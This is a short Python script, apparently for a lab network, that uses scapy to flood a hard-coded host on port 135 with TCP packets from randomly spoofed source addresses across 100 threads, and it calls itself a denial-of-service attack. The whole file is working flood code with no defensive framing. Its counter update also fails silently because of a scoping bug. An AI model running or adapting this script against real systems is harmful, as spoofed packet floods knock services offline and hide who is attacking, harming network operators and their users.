import socket
import random
import sys
import time
import threading
from scapy.all import *

from queue import Queue
socket.setdefaulttimeout(0.25)
print_lock = threading.Lock()

#target = input("Enter the host to be dos: ")
target = '192.168.56.102'
targetport = 135
total = 0

print("starting attack on host: ", target)

def portscan(port):
    src_ip = "%i.%i.%i.%i" %(random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
    dst_ip = target
    IP1 = IP(src = src_ip, dst = dst_ip)
    
    sp = random.randint(1, 65535)
    dp = targetport
    TCP1 = TCP(sport = sp, dport = dp)
    try:
        send(IP1/TCP1, verbose=0)
        with print_lock:
            print(total, "attack")
            total = total+1
    except:
        pass

def threader():
    while True:
        worker = q.get()
        portscan(worker)
        q.task_done()

q = Queue()
startTime = time.time()

for x in range(100):
    t = threading.Thread(target = threader)
    t.daemon = True
    t.start()

for worker in range(1, 10000):
    print(worker, "dos")
    q.put(worker)

q.join()

print("Time taken: ", time.time() - startTime)
